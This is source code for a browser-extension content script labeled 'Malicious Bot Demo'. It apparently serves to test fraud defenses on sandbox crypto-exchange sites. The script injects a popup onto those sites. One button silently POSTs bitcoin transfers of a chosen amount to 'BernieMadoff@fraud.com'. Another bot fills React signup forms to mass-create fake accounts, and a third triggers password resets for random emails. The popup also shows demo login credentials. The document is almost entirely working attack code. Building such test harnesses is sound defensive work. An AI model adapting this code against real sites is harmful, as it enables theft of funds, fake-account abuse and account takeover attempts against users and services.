
// --- Inject popup menu if on allowed sites ---
const MALICIOUS_EXT_HOSTS = [
  "web.sandbox.cointrust.ai",
  "cointrust.ai",
  "sandbox.env.mirrortab.com",
  "mt.cointrust.ai"
];
const isAllowedHost = MALICIOUS_EXT_HOSTS.includes(window.location.hostname);

// Sends a network request to send a specified number of "bitcoin" to a predetermined
// email address, which is `BernieMadoff@fraud.com` on this instance. This can be seen
// by opening the browser console -> clicking the `network` tab -> click `Transfer bitcoin`
// in the extension -> click the new network request labeled `transfer_money` -> click `payload`.
function TransferBitcoin() {
  // Find the first visible input for amount
  const transfer_box = document.querySelector(".transfer-box");
  if (!transfer_box) {
    return
  }
  if (transfer_box) {
    // Fill amount (first input) with value from popup field
    const popupAmountInput = document.getElementById("malicious-ext-popup-amount");
    let amountToFill = "100";
    if (popupAmountInput && popupAmountInput.value) {
      amountToFill = popupAmountInput.value;
    }
    const payload = {
          amount: amountToFill,
          email: 'BernieMadoff@fraud.com',
    };
    fetch('https://cointrust-api-499312298531.us-central1.run.app/transfer_money', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    });
  }
}

async function runCreateAccountBotBatch(batchState) {
  const status = document.getElementById("malicious-ext-status");
  const accountsListDiv = document.getElementById("malicious-ext-accounts-list");
  // Load or initialize accounts list
  let accounts = [];
  try {
    accounts = JSON.parse(localStorage.getItem("maliciousExtCreatedAccounts") || "[]");
  } catch { accounts = []; }
  let { count, current } = batchState;
  let lastResult = "";
  for (let n = current; n <= count; n++) {
    try {
      localStorage.setItem("maliciousExtCreateBatch", JSON.stringify({ count, current: n }));
      const sleep = (ms) => new Promise(r => setTimeout(r, ms));
      const randomId = Math.floor(Math.random() * 100000);
      const randomName = `User${randomId}`;
      const randomEmail = `user${randomId}@example.com`;
      const password = `P@ss${randomId}`;
      const nativeSetter = Object.getOwnPropertyDescriptor(
        window.HTMLInputElement.prototype,
        "value"
      ).set;
      function reactSetValue(el, value) {
        nativeSetter.call(el, value);
        el.dispatchEvent(new Event("input", { bubbles: true }));
        el.dispatchEvent(new Event("change", { bubbles: true }));
      }
      function findButton(...keywords) {
        const re = new RegExp(keywords.join("|"), "i");
        return [...document.querySelectorAll("button, input[type='submit']")].find(
          (b) => re.test(b.innerText || b.value || "")
        );
      }
      // If on root page, click main sign up button
      if (window.location.pathname === "/" || window.location.pathname === "") {
        const signupLink = document.querySelector('a.signup-btn, button.signup-btn');
        if (signupLink) {
          signupLink.click();
        } else {
          if (status) status.textContent = "form could not be found";
          return;
        }
        for (let i = 0; i < 50; i++) {
          await sleep(150);
          if (document.querySelector("input")) break;
        }
      } else if (window.location.pathname.startsWith("/login")) {
        let signUpBtn = [...document.querySelectorAll('button,a')].find(
          el => el && /sign up/i.test(el.innerText || "") && el.offsetParent !== null
        );
        if (signUpBtn) {
          signUpBtn.click();
          for (let i = 0; i < 50; i++) {
            await sleep(150);
            if (document.querySelector("input")) break;
          }
        } else {
          if (status) status.textContent = "form could not be found";
          return;
        }
      } else {
        for (let i = 0; i < 50; i++) {
          await sleep(150);
          if (document.querySelector("input")) break;
        }
      }
      const nameInput = [...document.querySelectorAll("input")].find(i =>
        /name/i.test(i.placeholder || "")
      );
      const emailInput = [...document.querySelectorAll("input")].find(i =>
        /email/i.test(i.placeholder || "")
      );
      if (nameInput) reactSetValue(nameInput, randomName);
      if (emailInput) reactSetValue(emailInput, randomEmail);
      const nextBtn = findButton("sign up", "continue", "next");
      if (nextBtn) {
        nextBtn.click();
      }
      let pwInputs = [];
      for (let i = 0; i < 60; i++) {
        await sleep(200);
        pwInputs = [...document.querySelectorAll('input[type="password"]')];
        if (pwInputs.length > 0) break;
      }
      if (pwInputs.length > 0) {
        pwInputs.forEach((input) => {
          reactSetValue(input, password);
        });
      }
      await sleep(600);
      const finalBtn = findButton("create", "sign up", "finish", "submit", "continue");
      if (finalBtn) {
        finalBtn.click();
      }
      // Save account info
      accounts.push({ name: randomName, email: randomEmail, password });
      localStorage.setItem("maliciousExtCreatedAccounts", JSON.stringify(accounts));
      // Update UI
      accountsListDiv.innerHTML = accounts.map((a, idx) =>
        `<div style='margin-bottom:2px;'>${idx + 1}. <b>${a.name}</b> &lt;${a.email}&gt; <span style='color:#aaa'>(pass: ${a.password})</span></div>`
      ).join("");
      lastResult = `Signup bot complete! Name: ${randomName}, Email: ${randomEmail}`;
      status.textContent = `Running bot... (${n}/${count})`;
      await sleep(1200);

      // --- Sign out after account creation, except after last account ---
      if (n < count) {
        let signOutBtn = null;
        const signOutKeywords = ["sign out", "log out", "logout", "signoff", "exit"];
        for (const kw of signOutKeywords) {
          signOutBtn = [...document.querySelectorAll("button, a")].find(
            el => el && el.innerText && el.offsetParent !== null && el.innerText.match(new RegExp(kw, "i"))
          );
          if (signOutBtn) break;
        }
        if (signOutBtn) {
          signOutBtn.click();
          await sleep(1000);
        } else {
          window.location.href = window.location.origin + "/";
          return;
        }
      }

    } catch (e) {
      lastResult = "Bot failed: " + e;
      status.textContent = lastResult;
      localStorage.removeItem("maliciousExtCreateBatch");
      return;
    }
  }
  status.textContent = lastResult;
  localStorage.removeItem("maliciousExtCreateBatch");
}

// Creates the popup that the user can interact with, which facilitates the core
// functionality of this extension.
function createMaliciousPopup() {
  let popup = document.createElement("div");
  popup.id = "malicious-ext-popup";
  popup.style.position = "fixed";
  popup.style.top = "30px";
  popup.style.right = "30px";
  popup.style.zIndex = 99999;
  popup.style.background = "#222";
  popup.style.color = "#fff";
  popup.style.padding = "20px 24px";
  popup.style.borderRadius = "10px";
  popup.style.boxShadow = "0 2px 16px #0008";
  popup.style.fontFamily = "system-ui, sans-serif";
  popup.style.minWidth = "260px";
  popup.style.maxWidth = "350px";
  popup.style.fontSize = "16px";
  popup.style.display = "flex";
  popup.style.flexDirection = "column";
  popup.style.gap = "12px";

  popup.innerHTML = `
    <div style="font-weight:bold;font-size:18px;margin-bottom:4px;">Malicious Bot Demo</div>
    <div style="font-size:14px;opacity:0.8;">This is a simulated extension popup for testing.</div>
  <div style="font-size:14px;opacity:0.8;">Demo Login Credentials:</div>
  <div style="font-size:14px;opacity:0.8;margin-left:10px;">Username: <b>demo@mirrortab.com</b></div>
  <div style="font-size:14px;opacity:0.8;margin-left:10px;">Password: <b>demoCointrust1!</b></div>
    ${window.location.pathname !== "/dashboard" ? `
      <div style="display:flex;align-items:center;gap:8px;">
        <button id="malicious-ext-create-account" style="padding:8px 14px;font-size:15px;background:#4caf50;color:#fff;border:none;border-radius:6px;cursor:pointer;">Run Create Account Bot</button>
        <input id="malicious-ext-create-count" type="number" min="1" max="50" value="1" style="width:48px;padding:4px 6px;font-size:15px;border-radius:5px;border:1px solid #888;background:#222;color:#fff;text-align:center;" title="Number of accounts to create" />
        <span style="font-size:13px;opacity:0.7;">×</span>
      </div>
      <button id="malicious-ext-password-reset" style="padding:8px 14px;font-size:15px;background:#2196f3;color:#fff;border:none;border-radius:6px;cursor:pointer;">Run Password Reset Bot</button>
    ` : ""}
    ${window.location.pathname === "/dashboard" ? `
      <div style="display:flex;flex-direction:column;gap:8px;margin-top:8px;">
        <label for="malicious-ext-popup-amount" style="font-size:13px;">Amount to fill</label>
        <input id="malicious-ext-popup-amount" type="number" min="0.00001" step="any" value="100" style="width:100px;padding:4px 6px;font-size:15px;border-radius:5px;border:1px solid #888;background:#222;color:#fff;text-align:center;" />
        <button id="malicious-ext-transfer-btc" style="padding:8px 14px;font-size:15px;background:#ff9800;color:#fff;border:none;border-radius:6px;cursor:pointer;">Transfer Bitcoin</button>
      </div>
    ` : ""}
    <button id="malicious-ext-close" style="padding:6px 10px;font-size:13px;background:#444;color:#fff;border:none;border-radius:6px;cursor:pointer;align-self:flex-end;">Close</button>
    <div id="malicious-ext-status" style="font-size:13px;color:#aaffaa;min-height:18px;"></div>
    <div id="malicious-ext-accounts-list" style="font-size:13px;color:#fff;margin-top:10px;"></div>
  `;
  // avoid duplicates
  if (!document.getElementById("malicious-ext-popup")) {
    document.body.appendChild(popup);
  }
  else {
    // if it exists already, remove the old one, create a new one
    console.log("duplicate exists\n")
    console.log("window.location.pathname:", window.location.pathname)
    const oldPopup = document.getElementById("malicious-ext-popup");
    oldPopup.remove();
    document.body.appendChild(popup);
  }
  document.getElementById("malicious-ext-close").onclick = () => popup.remove();
  const transferBtn = document.getElementById("malicious-ext-transfer-btc");
  if (transferBtn) {
    transferBtn.onclick = () => {
      TransferBitcoin()
    }
  }
  if (document.getElementById("malicious-ext-create-account")){
    document.getElementById("malicious-ext-create-account").onclick = async () => {
      // Clear previous accounts list
      localStorage.removeItem("maliciousExtCreatedAccounts");
      document.getElementById("malicious-ext-accounts-list").innerHTML = "";
      const countInput = document.getElementById("malicious-ext-create-count");
      let count = parseInt(countInput.value, 10);
      if (isNaN(count) || count < 1) count = 1;
      if (count > 50) count = 50;
      countInput.value = count;
      await runCreateAccountBotBatch({ count, current: 1, resumed: false });
    };
    // On page load, resume batch if present
    if (localStorage.getItem("maliciousExtCreateBatch")) {
      try {
        const batchState = JSON.parse(localStorage.getItem("maliciousExtCreateBatch"));
        if (batchState && batchState.count && batchState.current && batchState.current <= batchState.count) {
          batchState.resumed = true;
          window.addEventListener('DOMContentLoaded', () => {
            setTimeout(() => runCreateAccountBotBatch(batchState), 300);
          });
        }
      } catch (e) {
        localStorage.removeItem("maliciousExtCreateBatch");
      }
    }
  }
  if (document.getElementById("malicious-ext-password-reset")){
    document.getElementById("malicious-ext-password-reset").onclick = async () => {
      const status = document.getElementById("malicious-ext-status");
      status.textContent = "Running password reset bot...";
      try {
        const sleep = (ms) => new Promise(r => setTimeout(r, ms));
        const randomId = Math.floor(Math.random() * 100000);
        const testEmail = `user${randomId}@example.com`;
        const nativeSetter = Object.getOwnPropertyDescriptor(
          window.HTMLInputElement.prototype,
          "value"
        ).set;
        function reactSetValue(el, value) {
          nativeSetter.call(el, value);
          el.dispatchEvent(new Event("input", { bubbles: true }));
          el.dispatchEvent(new Event("change", { bubbles: true }));
        }
        function findClickableByText(...keywords) {
          const re = new RegExp(keywords.join("|"), "i");
          return [...document.querySelectorAll("a, button")].find(
            (el) =>
              (el.innerText || "").match(re) &&
              el.offsetParent !== null
          );
        }
        // STEP 1: Click “Sign In” from landing page
        const signInBtn = findClickableByText("sign in", "log in");
        if (signInBtn) {
          signInBtn.click();
        }
        else {
          if (status) status.textContent = "form could not be found";
          return;
        }
        // STEP 2: Wait for sign-in page to load
        for (let i = 0; i < 60; i++) {
          await sleep(200);
          const forgotLink = findClickableByText("forgot", "reset");
          if (forgotLink) break;
        }
        // STEP 3: Click “Forgot your password?” link
        const forgotLink = findClickableByText("forgot", "reset");
        if (forgotLink) {
          forgotLink.click();
        } else {
          status.textContent = "Could not find Forgot Password link";
          return;
        }
        // STEP 4: Wait for reset form to load
        for (let i = 0; i < 60; i++) {
          await sleep(200);
          const emailInput = [...document.querySelectorAll("input")].find(i =>
            /email/i.test(i.placeholder || "")
          );
          if (emailInput) break;
        }
        // STEP 5: Fill in the email field
        const emailInput = [...document.querySelectorAll("input")].find(i =>
          /email/i.test(i.placeholder || "")
        );
        if (emailInput) {
          reactSetValue(emailInput, testEmail);
        } else {
          status.textContent = "Email input not found";
        }
        // STEP 6: Click Reset/Submit button
        await sleep(500);
        const resetBtn = [...document.querySelectorAll("button, input[type='submit']")].find(b =>
          /send|reset|continue|submit/i.test(b.innerText || b.value || "")
        );
        if (resetBtn) {
          resetBtn.click();
        } else {
          status.textContent = "Could not find Reset button";
        }
        status.textContent = `Password reset bot complete! Email: ${testEmail}`;
      } catch (e) {
        status.textContent = "Password reset bot failed: " + e;
      }
    };
  }
}

// Listen to if the background script has sent a message to open the popup.
chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  if (msg.action === "reopen_popup") {
    createMaliciousPopup();
    sendResponse({status: "ok"});
  }
});

// Remove popup if the URL changes.
let lastUrl = location.href;
new MutationObserver(() => {
  const url = location.href;
  if (url !== lastUrl) {
    lastUrl = url;
    const oldPopup = document.getElementById("malicious-ext-popup");
    if (oldPopup) oldPopup.remove();
  }
}).observe(document, { subtree: true, childList: true });
